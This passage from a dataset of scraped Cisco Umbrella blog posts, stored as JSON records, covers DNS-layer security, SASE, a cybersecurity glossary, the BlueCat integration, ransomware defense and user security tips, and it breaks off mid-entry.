domain resolves to that IP, then if a domain D is adjacent to an IP that is live (malicious as of today) and the IP has a large degree of size N (where all its neighboring domains are also live), then we consider the domain D malicious. This graph is bipartite, as a domain cannot be linked to a domain, and no IP has an edge to another IP. Notice that N is a variable threshold that can be tuned to vary the aggressiveness of the reputation filtering technique. In our study, we observe that the higher the N, the higher confidence we have in a domain D being malicious (false positives decrease), but at the same time this lowers the number of newly discovered malicious domains. Below is a simple graph of a candidate domain mapping to two IPs, one benign and one is actively malicious and tied to several active malicious domains.", "date": "2013-03-20"},
{"website": "Cisco-Umbrella", "title": "How to navigate network security beyond the data center", "author": ["Lorraine Bellon"], "link": "https://umbrella.cisco.com/blog/how-to-navigate-network-security-beyond-the-data-center", "abstract": "There’s no question: the network has changed, and it continues to evolve. With a growing remote and roaming workforce, increased adoption of direct internet access at branch offices, and the widespread use of cloud-based apps and services, we’ve expanded the edges of the network well beyond the data center. As a result, traditional data center-oriented security solutions are no longer providing the protection that users need to stay safe against cyberthreats. New network, new security challenges As security shifts to the cloud, the tried-and-true network perimeter-based model of cybersecurity just can’t keep up. Today’s cybersecurity professionals are contending with an entirely new type of network and an entirely new set of security needs. And to make matters worse, they’re short on time, energy, and resources. Now more than ever, we need a new way to keep users, data, and devices safe from threats. But it can be tough to sort out which approach is best, as well as which technologies you need to reduce complexity, improve speed and agility, and secure your network. Too much to do, not enough time or budget Security operations and IT teams are trying to keep up with changing security needs by using a combination of different point solutions, but this fragmented approach to security only adds complexity. It’s nearly impossible to stay alert when facing a deluge of alerts from different security products. To fill in the gaps, today’s teams are increasingly seeking an entirely new type of security solution — one that consolidates and converges a variety of individual components into one unified, cloud-delivered service. By bringing previously disparate point solutions together, a service like this can deliver robust, flexible security from one simple, easy-to-manage source. And by delivering this security from the cloud, this solution is easy to deploy and can provide protection anywhere, on or off network. It’s all about convergence As security converges in the cloud, we get closer to achieving one simple goal: giving teams the ability to control and secure users, apps, devices, and data — anywhere and everywhere. Secure Access Service Edge (SASE – pronounced “sassy”) offers an alternative to traditional data center-oriented security, with a new type of architecture that brings together networking and security services in one unified solution designed to deliver strong security from edge to edge — including the data center, remote offices, roaming users, and beyond. By consolidating a variety of powerful point solutions in one service that can be deployed anywhere from the cloud, SASE can provide better protection and faster performance, while reducing the cost and work it takes to secure the network. Read more about the SASE concept in our eBook: A Roadmap to SASE . Start simple with DNS-layer security Stronger network security doesn’t happen overnight. But getting started on your journey doesn’t have to be complicated. Because DNS requests precede IP connection, DNS resolvers can stop threats before they reach your network or endpoints, blocking requests to malicious or unwanted destinations over any port or protocol. As a fundamental component of a SASE framework, DNS-layer security provides a single view of all internet activity across every location, while helping you prevent threats at the earliest point of contact. Here’s the best part – DNS-layer security doesn’t take months, or even weeks, to deploy. 78% of our customers saw immediate value less than one week after deploying Cisco Umbrella (and in one case, a network administrator saw value in less than 1 hour . 1 ) See for yourself – get started with a 14-day free trial of Cisco Umbrella today. 1 Source: Kris Verdonck, Network Administrator, Dimension Data, TechValidate customer survey", "date": "2020-07-14"},
{"website": "Cisco-Umbrella", "title": "New research shows consumers want cybersecurity from service providers", "author": ["Nada MacKinney"], "link": "https://umbrella.cisco.com/blog/new-research-shows-consumers-want-cybersecurity-from-service-providers", "abstract": "It’s a tough world out there when you are a telecommunications service provider (“telco” for short). Service providers are used to fighting for every single win, but recently the battle has intensified. Fierce competition pushes service providers to match prices and features, which means that services have become commodities in the eyes of customers. This forces more discounting, which leads to ever-lower margins and reduced commissions for service provider sales teams. Consumer revenue is flattening, so service providers are looking for new ways to deliver value for their customers and reinvigorate growth in their bottom lines. To succeed, a service provider needs to diversify beyond the triple play (bundled internet access, television, and telephone) and escape the constant battle to the bottom for low prices. Differentiate beyond the triple play Most service providers are seeking new ways to penetrate the consumer market beyond the triple play. Many telecommunications providers look to STL Partners, a global research and consulting firm who specializes in the telecommunications industry, for insights about how they can better serve their customers and maximize revenue. New research from STL Partners indicates that consumers are looking for more from their service providers than the basic services of prior years. New consumer opportunities emerge The consumer landscape is changing, opening new opportunities for service providers. As more consumers shift to working and attending school from home, they expect more from their home services. STL Partners reports that due to “increasing digital maturity of consumers in general, demand for reliable connectivity as well as additional value-add services is growing in the market. Consumers are expecting more from their broadband provider, and this presents telcos with an opportunity to become more relevant in the home.” 1 “Consumers are expecting more from their broadband provider, and this presents telcos with an opportunity to become more relevant in the home.” 1 The Changing Consumer Landscape: Telco Strategies for Success, STL Partners, 2020 The report delves into strategies that service providers can pursue to win in the home. One opportunity jumps to the top of the list: offer cybersecurity services to consumers as part of a differentiated service offering. Consumers are ready to pay serious money for cybersecurity Headlines in the news about data breaches, brands violating data privacy regulations, and hackers stealing personal information are all drawing consumer attention to the topic of digital security. STL Partners found that more than half of the respondents globally selected “cyber threats are a major concern” (25%) or “cyber threats are a concern for me” (33%). 1 Overall, cybersecurity is at the forefront of consumers’ minds. More specifically, this general cyberattack concern translates into a clear willingness to pay for protection. All consumer demographic groups express deep concern about cyberattacks Consumers show clear willingness to pay for security coverage, even in low average revenue per user (ARPU) markets Consumers are willing to purchase cybersecurity services from their broadband provider . Millennials are willing to pay even more for cybersecurity protection. All of this is music to a service provider’s ears. Cybersecurity offers a clear path to delivering a differentiated service that consumers will prefer and will command a premium price. Although we focus on cybersecurity in this blog post, the report also provides detailed insight into other in-home opportunities for telcos to explore. It reviews multiple strategies for service providers to capitalize on consumers’ heightened attention and desire to receive high-quality, high-reliability services in their homes. Cloud-delivered security with simple deployment For years, Cisco Umbrella for Service Providers Easy Protect and Mobile Protect have provided a “clean pipe” for small and medium businesses (SMB). Umbrella uncovers attackers’ infrastructures staged for attacks and proactively blocks requests to malicious destinations before a connection is established (without adding latency for users). With Umbrella, service providers stop phishing and malware infections earlier, identify already infected devices faster, and prevent data exfiltration. Now, the same great Umbrella security can also protect a service provider’s consumer customers. That’s a big deal. It’s been well established that SMBs face intense cybersecurity threats, and their cybersecurity needs are usually under-served. A recent Data Breach Investigations Report noted that 43% of all data breaches specifically target SMBs. 2 Likewise, consumers too face relentless cybersecurity threats with limited resources to fight back. Now, service providers can thwart those threats on behalf of their consumer customers by delivering cloud-delivered cybersecurity services as part of a new or existing offer. The consumer gains protection from malware, phishing, ransomware, and more, with no additional effort. The service provider generates revenue beyond connectivity, deploys protection rapidly with a simple attach, builds customer loyalty, and differentiates their brand from the competition. Simple to sell, easy to deploy and manage The consumer market is primed and ready for connectivity services with robust added security. STL Partners delivers specific guidance for how service providers can monetize this trend. To learn more, download the entire report here . Then, learn more about how Cisco Umbrella Easy Protect and Mobile Protect enables service providers to protect consumers and increase revenues with a simple attach to existing internet or mobile services. 1. The Changing Consumer Landscape: Telco Strategies for Success, STL Partners, 2020: https://learn-umbrella.cisco.com/analyst-report-library/the-changing-consumer-landscape-telco-strategies-for-success 2. 43% of All Data Breaches Target SMBs, Verizon 2019 Data Breach Investigations Report, https://enterprise.verizon.com/resources/executivebriefs/2019-dbir-executive-brief.pdf", "date": "2020-07-07"},
{"website": "Cisco-Umbrella", "title": "Cybersecurity Terms and Threats You Need to Know in 2020", "author": ["Lorraine Bellon"], "link": "https://umbrella.cisco.com/blog/cybersecurity-terms-and-threats-you-need-to-know-in-2020", "abstract": "Let’s do a show of hands — who loves jargon? Anyone? I didn’t think so. Face it, aside from trivia champions, jargon doesn’t make life any easier for us. If you’re attending your first security conference this year, you might feel like you need an interpreter to make sense of the technical terminology and acronyms you’ll find around every corner. At Cisco Umbrella, we’re fluent in cybersecurity – and we want to help you make sense of the often-confusing security landscape! In this post, we define key cybersecurity terms that everyone should know in 2020 — and beyond. Part 1: Threats Backdoor: A backdoor is an access point designed to allow quick and undetected entrance to a program or system, usually for malicious purposes. A backdoor can be installed by an attacker using a known security vulnerability, and then used later to gain unfettered access to a system. Botnet: A botnet is a portmanteau for “robot network.” It’s a collection of infected machines that can be used for any number of questionable activities, from cryptomining to DDoS attacks to automated spam comments on blogs. Command-and-control (C2) attacks: Command-and-control attacks are especially dangerous because they are launched from inside your network. Security technologies like firewalls are designed to recognize and stop malicious activity or files from entering your network. However, a command-and-control attack is trickier than a standard threat. A file doesn’t start out showing any malicious behavior, so it is deemed harmless by your firewall and permitted to enter your network. Once inside, the file stays dormant for a set period of time or after being triggered remotely. Then, the file reaches out to a malicious domain and downloads harmful data, infecting your network. Denial of Service (DoS) Attack: This type of attack consumes all of the resources of a target so that it can no longer be used or reached, effectively taking it down. DoS attacks are designed to take a website or server offline, whether for monetary, political, or other reasons. A DDoS, or Distributed Denial of Service attack, is a subcategory of DoS attack that is carried out using two or more hosts, often via a botnet. Drive-by download: A drive-by download installs malware invisibly in the background when the user visits a malicious webpage, without the user’s knowledge or consent. Often, drive-by downloads take advantage of browser or browser plug-in vulnerabilities that accept a download under the assumption that it’s a benign activity. Using an up-to-date secure browser can help protect you against this type of attack. Exploit: An exploit is any attack that takes advantage of a weakness in your system. It can make use of software, bits of data, and even social engineering (like pretending to be someone from your IT team who needs your password to perform a security update). To minimize exploits, it’s important to keep your software up-to-date and to be aware of social engineering techniques (see below). Malware: Malware is a generic term for any program installed on a system with the intent to corrupt, damage, or disable that system. Razy, TeslaCry, NotPetya, and Emotet are a few recent examples. Cryptomining malware: Cryptomining by itself is not necessarily malicious — many people mine crypto currency on their own systems. Malicious cryptomining, however, is a browser- or software-based threat that enables bad actors to hijack system resources to generate crypto currencies. Cryptomining malware is an easy way for bad actors to generate cash while remaining anonymous and without having to use their own resources. Learn more about the cryptomining malware threat . Ransomware: Ransomware is malware used to encrypt a victim’s data with an encryption key that is known only to the attacker. The data becomes unusable until the victim pays a ransom to decrypt the data (usually in cryptocurrency). Ransomware is a fast-growing and serious threat — learn more in our newly updated guide to ransomware defense ebook . Rootkits: A rootkit is a malicious piece of code that hides itself in your system, prevents detection, and enables bad actors to gain continued access to your system. If attackers gain full access to your system once, they can use rootkits to continue that access over a long period of time. Spyware: Malicious code that gathers information about you and your browsing habits, and then sends that information to a third party. Trojans: A trojan is a seemingly innocuous program that acts as a front for malicious code hiding inside. Trojans can do any number of things, from stealing data to allowing remote system control.  These programs take their name from the famous Grecian “Trojan Horse” that took advantage of a similar vulnerability. Viruses: Often used as a blanket term, a virus is a piece of code that attaches itself to files, such as email attachments or files you download online. Once it infects your system, it can cause all kinds of problems, whether that means deleting system files or corrupting your data. Computer viruses also replicate and spread across networks – just like viruses in the physical world. Worms: A worm is a type of malware that clones itself in order to spread to other computers, performing various damaging actions on whatever system it infects. Unlike a virus, a worm exists as a standalone entity — it isn’t hidden inside something else like an attachment. MitM or Man-in-the-Middle Attack: A MitM attack is pretty much what it sounds like. An attacker will intercept, relay, and potentially change messages between two parties without their knowledge. MitM can be used to break encryption, compromise account details, or gain access to systems by impersonating a user. Phishing: Phishing is a technique that mimics a legitimate communication (like an email from your online bank) to steal sensitive information. Like fishermen with a lure, attackers will attempt to take your personal information by using fake emails, forms, and web pages to coax you to provide it to them. Spear phishing is a form of phishing that targets one specific individual by using publicly accessible data about them, like from a business card or social media profile. Whale phishing goes one step further than spear phishing and describes a targeted attack on a high-ranking individual, like a CEO or government official. Social engineering: A general term for any activity in which an attacker is trying to manipulate you into revealing information, whether over email, phone, web forms, or social media platforms. Passwords, account credentials, social security numbers — we often don’t think twice about giving this information away to someone we can trust, but who’s really on the other end of the line? Protect yourself, and think twice before sharing. It’s always OK to verify the request for information in another way, like calling an official customer support number. Zero-day (0day): A zero day attack is when a bad actor exploits a new, previously unknown software vulnerability for which there is no patch. It’s a constant struggle to stay ahead of attackers, but you don’t have to do it alone — you can get help from the security experts at Cisco Talos . Part 2: Solutions Anti-malware: Anti-malware software is a broad category of software designed to block, root out, and destroy viruses, worms, and other nasty things that are described in this list. These products need to be updated regularly to ensure that they remain effective against new threats. They can be deployed at various points in the network chain (email, endpoint, data center, cloud) and either on-premises or delivered from the cloud. Cloud access security broker (CASB): This is software that provides the ability to detect and report on the cloud applications that are in use across your environment. It provides visibility into cloud apps in use as well as their risk profiles, and the ability to block/allow specific apps. Read more about securing cloud apps here . Cloud security: This is a subcategory of information security and network security. It is a broad term that can include security policies, technologies, applications, and controls that are used to protect sensitive company and user data wherever it is exposed in a public, private, or hybrid cloud environment. DNS-layer security: This is the first line of defense against threats because DNS resolution is the first step in establishing a connection to the internet. It blocks requests to malicious and unwanted destinations before a connection is even established — stopping threats over any port or protocol before they reach your network or endpoints. Learn more about DNS-layer security here . Email security: This refers to the technologies, policies, and practices used to secure the access and content of email messages within an organization. Many attacks are launched via email messages, whether through targeted attacks (see note on phishing above) or malicious attachments or links. A robust email security solution protects you from attacks whether email is in transit across your network or when it is on a user’s device. Encryption: This is the process of scrambling messages so that they cannot be read until they are decrypted by the intended recipient. There are several types of encryption, and it’s an important component of a robust security strategy. Endpoint security: if DNS-layer security is the first line of defense against threats, then you might think of endpoint security as the last line of defense! Endpoints can include desktop computers, laptop computers, tablets, mobile phones, desk phones, and even wearable devices — anything with a network address is a potential attack path. Endpoint security software can be deployed on an endpoint to protect against file-based, fileless, and other types of malware with threat detection, prevention, and remediation capabilities. Firewall: Imagine all the nasty, malicious stuff on the Internet without anything to stop it. A firewall stands between your trusted entities and whatever lies beyond, controlling access based on security rules. A firewall can be hardware or software, a standalone security appliance or a cloud-delivered solution . Next-generation firewall (NGFW): This is the industry’s new solution for an evolved firewall.  It is typically fully integrated with the rest of the security stack, threat-focused, and delivers comprehensive, unified policy management of firewall functions, application control, threat prevention, and advanced malware protection from the network to the endpoint. Security information and event management (SIEM): This is a broad term for products that deal with security information management (SIM) and security event management (SEM). These systems allow for aggregation of information and events into a single “pane of glass” for security teams to use. Secure web gateway (SWG): This is a proxy that can log and inspect all of your web traffic for greater transparency, control, and protection. It allows for real-time inspection of inbound files for malware, sandboxing, full or selective SSL decryption, content filtering, and the ability to block specific user activities in select apps. Secure internet gateway (SIG): This is a cloud-delivered solution that unifies a variety of connectivity, content control, and access technologies to provide users with safe access to the internet, both on and off the network. By operating from the cloud, a SIG protects user access anywhere and everywhere, with traffic routing to the gateway for inspection and policy enforcement regardless of what users are connecting to, or where they’re connecting from. Because a SIG extends security beyond the edge of the traditional network — and without the need for additional hardware or software — thousands of enterprises have adopted it as a modern catch-all for ensuring that users, devices, endpoints, and data have robust protection from threats. Secure access service edge (SASE): Gartner introduced an entirely new enterprise networking and security category called “secure access service edge.” SASE brings together networking and security services into one unified solution designed to deliver strong security from edge to edge — in the data center, at remote offices, with roaming users, and beyond. By consolidating a variety of powerful point solutions into one solution that can be deployed anywhere from the cloud, SASE can provide better protection and faster network performance, while reducing the cost and work it takes to secure the network. Cybersecurity is always evolving, and it can be hard to keep up with the rapid pace of changes. Be sure to bookmark this blog post – we’ll keep it up to date as new threats and technologies emerge. To learn more, check out our recent blog posts about cybersecurity research .", "date": "2020-01-14"},
{"website": "Cisco-Umbrella", "title": "BlueCat's DNS Edge Is Cisco Umbrella's Newest Integration", "author": ["Chris Riviere"], "link": "https://umbrella.cisco.com/blog/bluecats-dns-edge-is-cisco-umbrellas-newest-integration", "abstract": "Cisco Umbrella is widely recognized as one of the strongest products on the market for a secure and fast connection to the internet. And we are always looking for ways to deepen visibility and control for our customers. This is why we are teaming up with BlueCat, a leading provider of DNS, DHCP, and IPAM (DDI) management solutions. Studies show that 91% of malware uses DNS to establish command and control callbacks, navigate through network pathways, and exfiltrate data. Cisco Umbrella fills this traditional gap in network security by blocking the outbound requests made to the malicious domains. When Umbrella customers point their network traffic to our resolvers they get visibility into the egress (external) IP address of their network. By leveraging capabilities such as the Umbrella roaming client, Umbrella virtual appliance or AnyConnect integration, customers can get additional attribution such as Active Directory user names, internal IP addresses and hostname of computers. With the BlueCat DNS Edge integration, customers get greater visibility into the attribution of the external DNS query (ie. the source IP), as well as additional control with the use cases outlined below. This integration expands the use cases for DNS security into investigations of internal network traffic, restricting lateral movement, and decreasing forensic response times. The integration enables customers to get full visibility and protection for DNS traffic leaving your environment for users on and off network. How It Works DNS Edge deploys as a virtual machine at the “first hop” of any DNS query. This gives DNS Edge the ability to tie every request on the network to a specific device without the need for an agent. With the integration, BlueCat Edge sends additional attribution information (ie. internal client IP) for each external DNS query to Umbrella. This allows viewing of device-level data directly in Cisco Umbrella, providing more granular information into the source of network threats. Expand network visibility and control with the Cisco Umbrella and BlueCat integration Use Cases Investigate internal, “east-west” traffic: BlueCat’s “first hop” position on the network provides visibility into internal, “east-west” traffic – that’s 60% of all network queries – which mostly go unmonitored today. You can investigate internal traffic within DNS Edge, or send it to a SIEM and correlate it with other threat indicators. Using DNS Edge to apply security policies to this internal traffic means that security teams can contain lateral movement associated with advanced persistent threats and malicious insiders. This screenshot shows how internal traffic appears in DNS Edge. Searching by source IP, you can see all internal and external domains queried by that device, and refine the search further by subdomains or any other factor you choose. In this example, you can see how a query to a known bad domain then results in lateral movement to other internal resources. This expands your visibility beyond the external domain that is shown in Umbrella. Investigate lateral movement from IoT devices without agents: The threats to Internet of Things (IoT) devices are well known but difficult to properly control at an enterprise level. Since many IoT devices lack the capacity for security agents or any external software, blocking DNS queries as they leave the device is both a more elegant and more operationally feasible way to control a fleet of sensors at the enterprise level. Here’s an example of how a rogue IoT device would look in DNS Edge. This is a security camera which should only ever be hitting a single internal domain. When it unexpectedly connects to an external domain (in this case, easyridegolfcars.com), this is the first indicator of a compromise. Looking at the subsequent queries, you can see both lateral movement to internal domains as well as potential data exfiltration attempts to the same external site. Improve forensic response time: With all of this new data at their disposal, security teams are cutting their response time significantly – from days to minutes. Forensic investigators and threat hunters no longer have to compile DNS logs from recursive servers to find a source device – the data is available right in Cisco Umbrella or can be exported directly to a SIEM for further analysis. The rich context available from internal DNS data adds a new dimension to that analysis as well, uncovering additional connections to malicious activity. Improve network performance: Device-level DNS data is a critical source of intelligence on how networks are performing. With visibility into the source, type, and result of every DNS query across the network, operators can quickly spot DNS misconfigurations, architectural shortcomings, misbehaving clients, and a host of other issues that may be impacting network performance and client reliability. Getting Started With a few simple steps, you can connect Cisco Umbrella to DNS Edge and start applying security policies. This integration leverages the network device API integration available in Umbrella. This allows for additional attribution information to be sent from the BlueCat Edge device to Umbrella. This allows the investigating user to see the internal IP of the requesting client instead of just the egress IP that Umbrella would see in a traditional network deployment. Follow the steps below to take advantage of this integration. 1. Start off by creating an API key in Cisco Umbrella – you’ll want to choose the “Umbrella Network Devices” option. 2. Add that API key into DNS Edge. To do this, go to the Cisco Umbrella Integration tab on the main menu of DNS Edge. Paste in the API key and the secret. Once the API key is inserted, DNS Edge will appear as a network device within Cisco Umbrella. Initially, it will appear as “offline”, but will automatically switch to “active” once the data starts flowing. 3. Create a policy within Cisco Umbrella to handle external-facing traffic which comes from the DNS Edge service point (network device), just as you would do for any other network device. When looking at the DNS queries in Umbrella you will now see additional attribution. For example, in the screenshot below we can see which Edge device the query came from, alongside the internal IP of who made that request. Want to learn more? Cisco and BlueCat recently presented this new integration at a Tech Field Day event. You can check out the session recording , as well as the Cisco Umbrella BlueCat integration data sheet to learn more. This new integration with BlueCat adds one of the largest providers of DDI services to Umbrella’s integration arsenal, expanding on our existing integration with EfficientIP . If you’re heading to Cisco Live Barcelona next month be sure to stop by the BlueCat booth or La Taberna where Cisco Umbrella will be serving coffee and beer throughout the day. We would love to see you at the show!", "date": "2020-01-09"},
{"website": "Cisco-Umbrella", "title": "How to Defend Against Ransomware", "author": ["Rachel Ackerly"], "link": "https://umbrella.cisco.com/blog/ransomware-defense-for-dummies-2nd-edition", "abstract": "Ransomware tops the threat list again After a lull in 2018, ransomware has risen once again to the top of the threat list for businesses both large and small. In 2019, local governments, hospitals, and schools all faced ransomware attacks that locked up important data and disabled critical systems for days. The holidays might be here, but no one wants to unwrap a surprise cyber attack. Ransomware is one of the greatest security concerns ever to exist, it can strike at any time — even on the most seemingly resilient of systems. All it takes is one wayward click combined with inadequate security controls to lock down your network and potentially lose critical business information. According to Cybersecurity Ventures, a new organization will fall victim to ransomware every 14 seconds in 2019, and every 11 seconds by 2021. Why is this cyber threat on the rise? Simply put, ransomware remains an ever-growing problem because it is an extremely lucrative criminal enterprise. Targeted organizations often believe that paying the ransom is the most cost-effective way to get their data back — and, unfortunately, this may also be the reality. The problem is that every single business that pays to recover their files is directly funding the development of its next generation. As a result, it is evolving at an alarming rate with new and more sophisticated variants. This makes defending your organization’s data more critical than ever. Cybersecurity Ventures predicts ransomware attacks will cost the global economy $6 trillion annually by 2021. Ransomware has also become more pervasive, in part, thanks to the following: Ongoing digital transformation: As more organizations digitize their operations, the number of potential entry points (email, mobile devices, apps) increases exponentially. If a breach happens, infections can spread quickly since it’s more than likely these critical systems are connected. The rise of cryptocurrency: Currency, like Bitcoin, enables easy and virtually untraceable payments to anonymous cybercriminals. The emergence of Ransomware-as-a-Service (Raas): Ransomware kits can be purchased for a small fee, making it accessible for practically anyone, even non-technical criminals, to use and profit from easily. Plus, attackers are getting smarter. They know we’re distracted. And where are we more likely to be the most distracted? On our phones! In the 2019 Verizon Data Breach Investigations Report, Verizon found that users are much more vulnerable to social attacks that they receive on mobile devices. But where do you start? Lots of questions come to mind. With the ability to penetrate organizations in multiple ways, fighting this threat effectively requires more than one product. Cisco Ransomware Defense offers an integrated approach that provides protection from these cyber attacks for all office locations and users, even when users are off the virtual private network (VPN). Backed by unmatched threat intelligence from Cisco Talos, Cisco’s unified security architecture brings together complementary cyber security products including domain name system (DNS)-layer, web, email, endpoint, and network security. Email Protection Cisco Cloud Email Security with Advanced Malware Protection (AMP) blocks ransomware delivered through spam and phishing emails. It even identifies malicious attachments and URLs. Email is still the application that cyber attackers use most commonly to breach systems. Internet Protection Ransomware attacks use DNS to connect to attacker servers and compromise your network. Cisco Umbrella with DNS and IP layer enforcement stops ransomware over all ports and protocols. You can stay protected with Umbrella whether you are on or off the network. Endpoint Protection Cisco Advanced Malware Protection for Endpoints stops ransomware files from taking your system hostage. While you can’t completely prevent risky cyber behavior, you can enhance the security of your endpoints and servers. Want results like these? “Before Umbrella, I was attacked seven times by ransomware. Since the installation, I have not had one [attack].” Kevin Hood, IT Director, Habush Habush & Rottier Take action Need guidance? Check out our updated Ransomware Defense For Dummies eBook – freshly revised with the latest trends and techniques for stopping ransomware attacks as you enter 2020 and beyond. In five short chapters, you’ll learn how this cyber crime operates, best practices for reducing risk, and practical steps you can take to deploy a new best-of-breed security architecture.", "date": "2019-12-17"},
{"website": "Cisco-Umbrella", "title": "Cisco Umbrella’s Top 10 Cybersecurity Tips", "author": ["Lorraine Bellon"], "link": "https://umbrella.cisco.com/blog/cisco-umbrella-top-10-cybersecurity-tips", "abstract": "These days, everyone is getting busier, and to-do lists keep getting longer. It feels like there’s never enough time in the day, and it’s easy to get distracted when time is in short supply. We’ve heard it all before — security should always be at the top of your to-do list — but we know that’s not always the case. The weakest link in any security system is always the same — people. No matter how comprehensive, effective, or expensive your security tools are, it can all come crashing down if a single careless user makes one simple mistake. Every time someone decides to click on an unfamiliar link or open a suspicious email attachment, your organization could be facing massive data loss and significant disruption to your business. Most IT professionals know how to stay safe online, but most users aren’t experts. To help you stay protected, we’ve compiled a list of things everyone should be thinking about whenever they’re using the Internet. To help strengthen your organization’s cyber security practices, you can share this blog post with your users, or use these tips as a starting point for a security refresher training. You’ve probably heard many or all of these tips before, but repetition doesn’t hurt. Top 10 cybersecurity tips Here is our list of top 10 cybersecurity tips for anyone on the Internet (hint: that means you!). Realize that you are an attractive target to attackers, and it can happen to anyone, anytime, anywhere, on any device. Don’t ever say “It won’t happen to me.” Practice good password management. Use a strong mix of characters, and don’t use the same password for multiple sites. Don’t share your password with others and don’t write it down — no post-it note attached to your monitor! If you have trouble remembering your passwords, consider using a secure password vault. Then you only have to remember one (very strong) password. Never leave your devices unattended. If you need to leave your computer, phone, or tablet for any length of time — no matter how short — lock the screen so no one can use it while you’re gone. If you keep sensitive information on a flash drive or external hard drive, make sure to lock those up as well. Always be careful when clicking on attachments or links in email. If an email is unexpected or suspicious for any reason, don’t click on it. Even if it seems like it’s from your company CEO! Scammers can look up that information online and use it to target individuals in your company. Double check the URL of the website to see if it looks legitimate. Bad actors will often take advantage of spelling mistakes to direct you to a harmful domain. Sensitive browsing, such as banking or shopping, should only be done on a device that belongs to you, on a network that you trust. Whether you’re using a friend’s phone, a public computer, or free Wi-Fi at a coffee shop — your data could be copied or stolen. Back up your data regularly. Make sure your antivirus software is always turned on and up to date. Be conscientious of what you plug in to your computer. Malware can be spread through infected flash drives, external hard drives, and even smartphones. You might want to help someone find their lost item, but end up falling into a trap. Watch what you’re sharing on social networks. Criminals can find you and easily gain access to a shocking amount of information — where you go to school, where you work, when you’re on vacation — that could help them gain access to more valuable data. Be wary of social engineering, where someone attempts to gain information from you through manipulation. If someone calls or emails you asking for sensitive information like login information or passwords, it’s okay to say no. You can always call the company directly to verify credentials before giving out any information. Be sure to monitor your accounts for any suspicious activity. If you see something unfamiliar, it could be a sign that you’ve been compromised. Don’t be afraid to speak up and tell your IT team if you notice anything unusual. Remember, you’re the victim of the attack, and you’re not in trouble! Share this list with your users and help them understand what IT teams already do — that cybersecurity is a team sport. Of course, it’s important to have strong security tools to protect your users too. But how do you know if your current set of tools is enough? Check out our infographic to learn about 3 red flags you’re not getting what you were promised from your security stack . There’s no substitute for educating your users, but defense matters too. Nothing is more important than your first line of defense. Because it’s built into the foundation of the internet, Cisco Umbrella can protect your network from malware, ransomware, malicious cryptomining, and other advanced threats by blocking connections at the DNS layer. Your users may never thank you, but your security operations team will!", "date": "2019-12-04"},
{"website": "Cisco-Umbrella", "title": "Gartner Defines New Secure Access Service Edge (SASE) Solution – What You Need to Know", "author": ["Kate MacLean"], "link": "https://umbrella.cisco.com/blog/securitys-new-address-the-cloud", "abstract": "Did you get the message? I guess it’s official. Everything, including security, is moving to the cloud. But don’t just take my word for it. Last month Gartner published a new report, “ The Future of Network Security is in the Cloud ,” and it’s a good read. What’s all the fuss about? This is not a new story. Let’s face it, security teams have been struggling for a long time. Too many systems. Too many alerts. Too much sensitive data located outside of the enterprise data center in cloud services. And more user traffic using public cloud services instead of the enterprise data center. Why is it that with more security tools than ever, threats like resilient ransomware, malicious cryptomining, and good old-fashioned phishing continue to wreak havoc? We see more malware penetrating more systems than ever before. The answer — or rather maybe the problem causing these challenges — is that the existing security infrastructure was designed for a locked-down environment. Today’s networks are digitally transforming before our eyes. We’re just not able to secure our workers, our branch offices, our data centers in the same ways as before. The data center is no longer the hub of access requirements for users and devices. SaaS adoption, direct internet access, and cloud service apps have changed the game. It’s time for a change in security, too. According to Gartner, “Digital business transformation inverts network and security service design patterns, shifting the focal point to the identity of the user and/or device — not the data center. Security and risk management leaders need a converged cloud-delivered secure access service edge to address this shift.” Gartner analysts project that demand for security-as-a-service, referred to as secure access service edge (SASE), will grow significantly in the next five years, estimating that by 2024, a minimum of 40% of companies will have plans to adopt SASE (pronounced like “sassy”). We could all use a more sassy approach to our security, right? The new market brings together SD-WAN along with network security services such as secure web gateway (SWG), cloud access security broker (CASB), and firewall-as-a-service. Digital business transformation is moving security to the cloud, which drives a parallel need for converged services that help reduce complexity, improve speed and agility, and secure the new network architecture of tomorrow. With more users, devices, applications, services and data located outside of an enterprise rather than inside, the existing security models are failing to meet today’s business needs. In the report, Gartner recommends specific actions that security and risk management leaders can take to reduce complexity as security shifts from the data center to the user and/or device. I’d recommend reading the report to learn how to: Position the adoption of SASE within your company Explain the value of shifting from a “box approach” to cloud-delivered policy-based security services Utilize software-defined WAN as a springboard for network transformation Adopt integrated cloud-delivered security services that are simple, scalable, and flexible Change can be hard. Let’s face it, it’s sometimes comfier on the old couch. But there can be a lot of benefits of adopting SASE. These include, but are not limited to, the following: Consistency: better security applied consistently in an integrated way from the cloud Simplification: reduce tools, complexity, and costs Performance: reduce latency and improve performance Operational improvements: centralize management, increase staff effectiveness, improve ease of use Here’s another goody from Gartner: “Complexity, latency and the need to decrypt and inspect encrypted traffic once will increase demand for consolidation of networking and security-as-a-service capabilities into a cloud-delivered secure access service edge.” If you’re looking for a better way to adopt the cloud and gain more visibility and control to protect your users and data, I encourage you to read this newest report from Gartner. Get the good stuff: Read the full Gartner report here", "date": "2019-11-25"},
{"website": "Cisco-Umbrella", "title": "How to Secure Your Wi-Fi in Minutes", "author": ["Rachel Ackerly"], "link": "https://umbrella.cisco.com/blog/if-you-love-your-wi-fi-secure-it", "abstract": "Humans can live for 3 weeks without food and 3 days without water. But they can’t wait 3 minutes for a secure Wi-Fi connection… or any connection, for that matter. Don’t agree? Go to a restaurant in any city and look around. In 2019, I see way too many devices. Babies play with devices. Tweens beg for devices. Teens live on devices. And adults – let’s be honest. We’re not setting a good example for anyone. We’ve got a really odd relationship with our need to always be connected to the Internet. How about a group hug, anyone? Nope. No group hugs. We just need the safety and security of a warm (and optimally secure) Wi-Fi connection. But if we love our Wi-Fi this much, where is all the security? There has to be an easier way to solve for today’s eager beaver who does not want to take the time to ensure his or her connection is safe. Mobile malware is nothing new. But in recent months, attackers have been getting more creative and resourceful with how they conceal, distribute and deploy these threats. According to Verizon’s most recent “Mobile Security Index 2019,” one-third of companies reported suffering a compromise that involved mobile devices. Despite this, more than half said they had sacrificed security to “get the job done…” And if that’s not shocking enough, an incredible 81 percent of respondents said they had personally used insecure public Wi-Fi for work, despite knowing that the practice is both unsafe and prohibited by company policy. Uh, oh. That’s a no-no. It’s time to combine network and security data for insights that not only help you optimize your network’s performance, but keep it secure. And you don’t need to worry. Now there’s an easier way to protect every user on your Meraki network in minutes without deploying an additional security appliance. Simple, effective protection for Wi-Fi Cisco Meraki and Cisco Umbrella offer simple and effective protection for your Wi-Fi network. Cisco Umbrella is a DNS-layer security solution built into the backbone of the Internet. It blocks users from accessing malicious sites before the connection is made, and offers the first line of defense against security breaches on your wireless network. With Cisco Umbrella, it takes only a few clicks to set up custom 